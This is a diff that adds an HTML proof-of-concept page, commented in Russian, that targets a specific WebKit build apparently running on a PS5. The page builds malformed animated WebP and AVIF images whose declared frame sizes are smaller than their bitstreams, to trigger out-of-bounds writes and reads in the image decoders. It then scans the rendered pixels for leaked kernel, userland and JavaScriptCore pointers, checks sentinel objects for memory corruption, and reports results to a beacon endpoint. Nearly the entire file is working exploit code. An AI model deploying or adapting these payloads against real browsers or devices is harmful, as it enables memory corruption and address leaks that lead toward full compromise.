@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<!--
+  l3-webp-oob.html — animated WebP frame-size mismatch (OOB write+read) + AVIF ispe mismatch.
+
+  Основание (recon-emulation, WebKit-7617.1.11 = 7779ac11f):
+    * WEBPImageDecoder.cpp L184-196: буфер декодера (external memory) выделяется по
+      размерам КАДРА ИЗ КОНТЕЙНЕРА: stride = webpFrame.width*4, size = stride*webpFrame.height.
+    * libwebp декодирует по размерам ИЗ БИТСТРИМА => при расхождении пишет/читает мимо
+      буфера; applyPostProcessing (L270-285) читает со stride frameRect.width().
+    * Единственные проверки — ASSERT_WITH_SECURITY_IMPLICATION (L271-272), а он no-op без
+      ENABLE(SECURITY_ASSERTIONS) (Assertions.h L351-362) — на релизной PS5 не работает.
+    * AVIF (AVIFImageReader.cpp L58, L87-101): rowBytes = imageSize.width()*4,
+      avifImageYUVToRGB пишет image->height строк по image->width — проверки «кадр <= canvas»
+      в 7617 нет => OOB-WRITE.
+
+  Проба: buildAnimatedWebP() собирает RIFF-контейнер (VP8X/ANIM/ANMF) с валидным
+  VP8L/VP8-битстримом из констант (сгенерированы PIL), но ANMF объявляет МЕНЬШИЙ кадр
+  (8x1/1x1) — декодер выделяет маленький буфер, libwebp декодирует 16x1 => OOB.
+  AVIF-вариант: валидный 64x64 AVIF и он же с ispe, пропатченным на 32x32.
+
+  Чтение: Image -> drawImage (масштаб) -> getImageData -> скан 8-байтовых окон на
+  канонические адреса (userland 0x0000_xxxx, kernel 0xffff, JSC 0xfffe).
+  Запись: перед декодом создаются sentinel-объекты (Uint8Array 4 КБ 0xAA + канвас с
+  известными пикселями); после декода проверяется, не изменились ли они (OOB-write в
+  соседний объект). Критерий: ptrcands>0 ИЛИ зафиксированная порча (corrupt>0).
+-->
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>L3 WebP/AVIF OOB</title>
+<body style="background:#000;color:#0f0;font:12px monospace">
+<pre id="out">L3 webp-oob boot…</pre>
+<script>
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, data) {
+  var line = 'L3-' + tag + (data === undefined ? '' : ' ' + data);
+  say(line);
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/' + encodeURIComponent(line.slice(0, 700)) + '?t=' + Date.now(), true); x.send(); } catch (e) {}
+}
+/* сгенерированные офлайн константы (PIL / ffmpeg) */
+var WEBP_PAYLOADS = {
+ "vp8l_16_VP8L": "Lw8AAAAHUJFGdKb/gYjofwA=",
+ "vp8_16_VP8": "cAEAnQEqEAABAAFAJiWMAnQBQAAA/vsZywJK1ZunLM4V58AA",
+ "vp8l_9_VP8L": "LwgAAAAHUJFGdKb/gYjofwA=",
+ "vp8_9_VP8": "cAEAnQEqCQABAAFAJiWMAnQBQAAA/vsZywJK1ZunLM4V58AA",
+ "vp8l_8_VP8L": "LwcAAAAHUJFGdKb/gYjofwA=",
+ "vp8_8_VP8": "cAEAnQEqCAABAAFAJiWMAnQBQAAA/vsZywJK1ZunLM4V58AA",
+ "vp8l_64_VP8L": "Lz8AAAAHUJFGdKb/gYjofwA=",
+ "vp8_64_VP8": "0AIAnQEqQAABAD5tMpZHpCKiISgIAIANiWcAAD2joAD++Op/8Gu9J8X+kulxpr0IAAA="
+};
+var AVIF_VALID_B64 = 'AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAD5bWV0YQAAAAAAAAAvaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAFBpY3R1cmVIYW5kbGVyAAAAAA5waXRtAAAAAAABAAAAHmlsb2MAAAAARAAAAQABAAAAAQAAASEAAAAbAAAAKGlpbmYAAAAAAAEAAAAaaW5mZQIAAAAAAQAAYXYwMUNvbG9yAAAAAGppcHJwAAAAS2lwY28AAAAUaXNwZQAAAAAAAABAAAAAQAAAABBwaXhpAAAAAAMICAgAAAAMYXYxQ4EADAAAAAATY29scm5jbHgAAgACAAIAAAAAF2lwbWEAAAAAAAAAAQABBAECgwQAAAAjbWRhdAoGGBV//bAIMhEYAAAAUAAAAAoFdpx1r2i12A==';
+var AVIF_ISPE32_B64 = 'AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAD5bWV0YQAAAAAAAAAvaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAFBpY3R1cmVIYW5kbGVyAAAAAA5waXRtAAAAAAABAAAAHmlsb2MAAAAARAAAAQABAAAAAQAAASEAAAAbAAAAKGlpbmYAAAAAAAEAAAAaaW5mZQIAAAAAAQAAYXYwMUNvbG9yAAAAAGppcHJwAAAAS2lwY28AAAAUaXNwZQAAAAAAAAAgAAAAIAAAABBwaXhpAAAAAAMICAgAAAAMYXYxQ4EADAAAAAATY29scm5jbHgAAgACAAIAAAAAF2lwbWEAAAAAAAAAAQABBAECgwQAAAAjbWRhdAoGGBV//bAIMhEYAAAAUAAAAAoFdpx1r2i12A==';
+
+
+/* =============================== helpers =============================== */
+function b64bytes(b64) {
+  var bin = atob(b64), out = new Uint8Array(bin.length);
+  for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i) & 255;
+  return out;
+}
+function bytesArr(v) { var a = []; for (var i = 0; i < v.length; i++) a.push(v[i] & 255); return a; }
+function b64ToDataURL(b64, mime) { return 'data:' + mime + ';base64,' + b64; }
+function u24le(v) { return [v & 255, (v >>> 8) & 255, (v >>> 16) & 255]; }
+function chunk(id, payload) {
+  var out = [];
+  for (var i = 0; i < 4; i++) out.push(id.charCodeAt(i));
+  var n = payload.length;
+  out.push(n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255);
+  for (i = 0; i < n; i++) out.push(payload[i] & 255);
+  if (n & 1) out.push(0);
+  return out;
+}
+function riff(chunks) {
+  var body = [];
+  for (var i = 0; i < chunks.length; i++) body = body.concat(chunks[i]);
+  var out = [0x52, 0x49, 0x46, 0x46]; // RIFF
+  out.push(body.length & 255, (body.length >>> 8) & 255, (body.length >>> 16) & 255, (body.length >>> 24) & 255);
+  out.push(0x57, 0x45, 0x42, 0x50); // WEBP
+  return out.concat(body);
+}
+/* frames: [{x,y,w,h,payloadKey,duration,blend,dispose}] — payloadKey: 'vp8l_16_VP8L' и т.п. */
+function buildAnimatedWebP(canvasW, canvasH, frames) {
+  var vp8x = [0x02, 0x00, 0x00, 0x00].concat(u24le(canvasW - 1), u24le(canvasH - 1));
+  var anim = [0, 0, 0, 0, 0, 0]; // bg + loop
+  var chunks = [chunk('VP8X', vp8x), chunk('ANIM', anim)];
+  frames.forEach(function (f) {
+    var pl = b64bytes(WEBP_PAYLOADS[f.payloadKey]);
+    var fourcc = f.payloadKey.indexOf('vp8l') >= 0 ? 'VP8L' : 'VP8 ';
+    var hdr = u24le(Math.floor((f.x || 0) / 2)).concat(u24le(Math.floor((f.y || 0) / 2)),
+      u24le(f.w - 1), u24le(f.h - 1), u24le(f.duration || 100));
+    var flags = ((f.blend === undefined ? 0 : f.blend) & 1) | (((f.dispose === undefined ? 0 : f.dispose) & 3) << 1);
+    hdr.push(flags);
+    var payload = hdr.concat(chunk(fourcc, pl));
+    chunks.push(chunk('ANMF', payload));
+  });
+  return riff(chunks);
+}
+
+/* =============================== scan =============================== */
+var MARKER = [0x11, 0x22, 0x33, 0xFF];
+function isPtrCandidate(v) {
+  var hi32 = Number((v >> 32n) & 0xffffffffn), lo32 = Number(v & 0xffffffffn);
+  var hi16 = Number((v >> 48n) & 0xffffn);
+  if (hi32 === 0 && lo32 >= 0x1000 && lo32 < 0x80000000) return 'userland32';
+  if (hi16 === 0xffff && v !== 0xffffffffffffffffn) return 'kernel/JSC-tag';
+  if (hi16 === 0xfffe) return 'JSC-cell-tag';
+  if (hi16 === 0x0000 && lo32 !== 0 && (lo32 & 7) === 0) return 'canonical-userland';
+  return false;
+}
+function scanPixels(data) {
+  var b = data.data, u = new Uint8Array(b.buffer, b.byteOffset, b.byteLength);
+  var foreign = 0, cands = [], i;
+  for (i = 0; i + 4 <= u.length; i += 4) {
+    if (u[i] !== MARKER[0] || u[i + 1] !== MARKER[1] || u[i + 2] !== MARKER[2] || u[i + 3] !== MARKER[3]) foreign += 4;
+  }
+  for (i = 0; i + 8 <= u.length; i += 8) {
+    var v = 0n;
+    for (var k = 7; k >= 0; k--) v = (v << 8n) | BigInt(u[i + k]);
+    var kind = isPtrCandidate(v);
+    if (kind) { var hx = v.toString(16); while (hx.length < 16) hx = '0' + hx; cands.push({ off: i, kind: kind, hex: '0x' + hx }); if (cands.length >= 16) break; }
+  }
+  return { total: u.length, foreign: foreign, cands: cands };
+}
+function makeSentinels() {
+  var arr = new Uint8Array(4096); for (var i = 0; i < arr.length; i++) arr[i] = 0xAA;
+  var cv = document.createElement('canvas'); cv.width = 4; cv.height = 4;
+  var cx = cv.getContext('2d');
+  for (var y = 0; y < 4; y++) for (var x = 0; x < 4; x++) { cx.fillStyle = 'rgb(' + (x * 40) + ',' + (y * 40) + ',7)'; cx.fillRect(x, y, 1, 1); }
+  return { arr: arr, cv: cv, cx: cx };
+}
+function checkSentinels(s) {
+  var diff = 0, first = -1, firstByte = -1;
+  for (var i = 0; i < s.arr.length; i++) if (s.arr[i] !== 0xAA) { diff++; if (first < 0) { first = i; firstByte = s.arr[i]; } }
+  var cvDiff = 0;
+  try {
+    var px = s.cx.getImageData(0, 0, 4, 4).data;
+    for (var j = 0; j < px.length; j += 4) {
+      var x = j / 4 % 4, y = Math.floor(j / 4 / 4);
+      if (px[j] !== x * 40 || px[j + 1] !== y * 40 || px[j + 2] !== 7) cvDiff++;
+    }
+  } catch (e) { cvDiff = 'err'; }
+  return { diff: diff, first: first, firstByte: firstByte, cvDiff: cvDiff };
+}
+
+/* =============================== variants =============================== */
+var VARIANTS = [
+  { id: 'W1-webp-calib-16x1', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 16, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W2-webp-mismatch-8x1-payload16', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W3-webp-mismatch-8x1-lossy16', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8_16_VP8' }] },
+  { id: 'W4-webp-mismatch-1x1-payload16', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 1, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W5-webp-offsets-FFFE', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0xFFFE, y: 0xFFFE, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W6-webp-canvas1x1-frame8x1', kind: 'webp', canvas: [1, 1], frames: [
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W7-webp-9x1-into-8x1', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_9_VP8L' }] },
+  { id: 'W8-webp-two-frames-second-mismatch', kind: 'webp', canvas: [32, 32], frames: [
+      { x: 0, y: 0, w: 16, h: 1, payloadKey: 'vp8l_16_VP8L' },
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
+  { id: 'W9-webp-64x1-into-8x1', kind: 'webp', canvas: [64, 8], frames: [
+      { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_64_VP8L' }] },
+  { id: 'A1-avif-valid-64x64', kind: 'avif', b64: 'AVIF_VALID_B64' },
+  { id: 'A2-avif-ispe32-payload64', kind: 'avif', b64: 'AVIF_ISPE32_B64' }
+];
+
+/* =============================== runner =============================== */
+var rows = [], pos = 0;
+function resultLine(state, extra) {
+  var r = extra || {};
+  rows.push({ id: VARIANTS[pos].id, state: state, ptr: r.ptr || 0, foreign: r.foreign || 0,
+    best: r.cands && r.cands.length ? r.cands[0].hex : '-', corrupt: r.corrupt || 0 });
+  bk('ROW', VARIANTS[pos].id + ' | state=' + state + ' | foreign=' + (r.foreign || 0) +
+    'B | ptrcands=' + (r.ptr || 0) + ' | corrupt=' + (r.corrupt || 0) + ' | best=' +
+    (r.cands && r.cands.length ? r.cands[0].hex : '-'));
+}
+function finish() {
+  var ptr = rows.reduce(function (a, r) { return a + r.ptr; }, 0);
+  var corrupt = rows.reduce(function (a, r) { return a + (r.corrupt ? 1 : 0); }, 0);
+  var bestRow = rows.slice().sort(function (a, b) {
+    return (b.ptr - a.ptr) || (b.corrupt - a.corrupt) || (b.foreign - a.foreign);
+  })[0];
+  bk('SUMMARY', 'variants=' + rows.length + ' decoded=' + rows.filter(function (r) { return r.state === 'decoded'; }).length +
+    ' ptrcands=' + ptr + ' corruptVariants=' + corrupt);
+  if (corrupt) {
+    bk('CORRUPT-LIST', rows.filter(function (r) { return r.corrupt; }).map(function (r) { return r.id; }).join(','));
+  }
+  bk('DONE', 'ptrcands=' + ptr + ' corrupt=' + corrupt +
+    ' best=' + (bestRow && bestRow.best !== '-' ? bestRow.best : '-') +
+    ' variant=' + (bestRow ? bestRow.id : '-'));
+}
+function runNext() {
+  if (pos >= VARIANTS.length) { finish(); return; }
+  var V = VARIANTS[pos], src = null, mime = '';
+  try {
+    if (V.kind === 'webp') src = b64ToDataURL((function () {
+      var arr = buildAnimatedWebP(V.canvas[0], V.canvas[1], V.frames);
+      var bin = ''; for (var i = 0; i < arr.length; i++) bin += String.fromCharCode(arr[i] & 255);
+      return btoa(bin);
+    })(), 'image/webp');
+    else { mime = 'image/avif'; src = b64ToDataURL(V.b64 === 'AVIF_VALID_B64' ? AVIF_VALID_B64 : AVIF_ISPE32_B64, mime); }
+  } catch (e) { bk('BUILD-FAIL', V.id + ' ' + e); resultLine('build-fail', {}); pos++; runNext(); return; }
+  var sent = makeSentinels();
+  var img = new Image(), settled = false;
+  var timer = setTimeout(function () {
+    if (settled) return; settled = true;
+    resultLine('timeout', {}); pos++; runNext();
+  }, 1500);
+  img.onerror = function () { if (settled) return; settled = true; clearTimeout(timer); resultLine('decode-fail', {}); pos++; runNext(); };
+  img.onload = function () {
+    if (settled) return; settled = true; clearTimeout(timer);
+    try {
+      var cv = document.createElement('canvas');
+      var nw = Math.max(img.naturalWidth || 1, 1), nh = Math.max(img.naturalHeight || 1, 1);
+      cv.width = Math.min(Math.max(nw, 256), 512); cv.height = Math.min(Math.max(nh, 256), 512);
+      var cx = cv.getContext('2d');
+      cx.fillStyle = '#000'; cx.fillRect(0, 0, cv.width, cv.height);
+      cx.drawImage(img, 0, 0, cv.width, cv.height);
+      var scan = scanPixels(cx.getImageData(0, 0, cv.width, cv.height));
+      var corr = checkSentinels(sent);
+      var corrupt = (corr.diff > 0 ? 1 : 0) + (corr.cvDiff ? 1 : 0);
+      if (corrupt) bk('CORRUPTION', V.id + ' arrDiff=' + corr.diff + ' first=' + corr.first +
+        ' byte=0x' + (corr.firstByte & 255).toString(16) + ' cvDiff=' + corr.cvDiff);
+      if (scan.cands.length) scan.cands.forEach(function (c) { bk('PTRCAND', V.id + ' off=' + c.off + ' kind=' + c.kind + ' ' + c.hex); });
+      resultLine('decoded', { foreign: scan.foreign, ptr: scan.cands.length, cands: scan.cands, corrupt: corrupt });
+    } catch (e) { bk('READ-ERR', V.id + ' ' + e); resultLine('read-err', {}); }
+    pos++; runNext();
+  };
+  img.src = src;
+}
+bk('BOOT', 'l3-webp-oob variants=' + VARIANTS.length +
+  '; criterion: ptrcands>0 OR corruption(sentinel diff)>0; механизм: ANMF frame < VP8 bitstream / AVIF ispe < payload');
+runNext();
+</script>
